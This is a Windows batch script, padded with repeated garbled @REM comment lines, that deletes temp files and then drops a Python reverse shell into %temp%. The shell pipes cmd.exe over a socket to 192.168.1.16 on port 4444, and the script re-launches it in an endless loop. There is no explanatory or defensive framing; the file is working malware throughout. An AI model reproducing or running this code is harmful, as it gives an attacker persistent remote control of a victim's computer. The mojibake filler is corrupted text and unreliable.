@REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
@REM @yÈh off
@REM cd %µé©%
@REM yÈh @yÈh off  ([µÛ]£.bat
@REM yÈh @yÈh off  ([µÛ]£.bat
@REM yÈh cd %µé©%  ([µÛ]£.bat
@REM yÈh :)  ([µÛ]£.bat
@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
@REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
@REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
@REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
@REM yÈh yÈh            yÈh jh® os^ ¦º5.bat^  ([µÛ]£.bat
@REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
@REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
@REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]£.b
@echo off
del %temp%\rev.bat
del %temp%\vb.bat
:loop
set FILE=%temp%\sh.py
if not exist %FILE% (
    (
@REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
@REM @yÈh off
@REM cd %µé©%
@REM yÈh @yÈh off  ([µÛ]£.bat
@REM yÈh cd %µé©%  ([µÛ]£.bat
@REM yÈh :)  ([µÛ]£.bat
@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
@REM cd %µé©%
@REM yÈh @yÈh off  ([µÛ]£.bat
@REM yÈh cd %µé©%  ([µÛ]£.bat
@REM yÈh :)  ([µÛ]£.bat
@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
@REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
@REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
@REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
@REM yÈh yÈh            yÈh jh® os^ ¦º5.bat^  ([µÛ]£.bat
@REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
@REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
@REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]£.b
        echo import socket
        echo import os
        echo import threading
        echo import subprocess as sp
        echo import time
        echo.
        echo def rev^(^)^:
        echo    p = sp.Popen^(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT^)
        echo    s = socket.socket^(^)
        echo.
        echo    try:
        echo        s.connect^(^('192.168.1.16', 4444^)^)
@REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
@REM @yÈh off
@REM cd %µé©%
@REM yÈh @yÈh off  ([µÛ]£.bat
@REM yÈh cd %µé©%  ([µÛ]£.bat
@REM yÈh :)  ([µÛ]£.bat
@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
@REM @yÈh off
@REM cd %µé©%
@REM yÈh @yÈh off  ([µÛ]£.bat
@REM yÈh cd %µé©%  ([µÛ]£.bat
@REM yÈh :)  ([µÛ]£.bat
@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
@REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
@REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
@REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
@REM yÈh yÈh            yÈh jh® os^ ¦º5.bat^  ([µÛ]£.bat
@REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
@REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
@REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]£.b
        echo    except ConnectionRefusedError as e:
        echo        print^('refused ... Check if listener is running.'^)
        echo        return
        echo.
        echo    def s_o^(^)^:
        echo        while True^:
        echo            try^:
        echo                output = os.read^(p.stdout.fileno^(^), 1024^)
        echo                if not output^:
        echo                    break
        echo                s.sendall^(output^)
        echo            except Exception as e^:
        echo                print^("Error sending output:", e^)
        echo                break
        echo.
        echo    def r_i^(^)^:
        echo        while True^:
        echo            try^:
        echo                data = s.recv^(1024^)
        echo                if not data^:
        echo                    break
        echo                p.stdin.write^(data^)
        echo                p.stdin.flush^(^)
        echo            except Exception as e^:
        echo                print^("Error receiving input:", e^)
        echo                break
        echo.
        echo    threading.Thread^(target=s_o, daemon=True^).start^(^)
        echo    threading.Thread^(target=r_i, daemon=True^).start^(^)
        echo.
        echo    time.sleep^(30^)
        echo.
        echo while True^:
        echo    rev^(^)
        echo    print^("Loading ..."^)
    ) > %FILE%
) else (
   python3 %FILE%
   timeout /t 60 >nul
)
goto loop
@REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
@REM @yÈh off
@REM cd %µé©%
@REM yÈh @yÈh off  ([µÛ]£.bat
@REM yÈh cd %µé©%  ([µÛ]£.bat

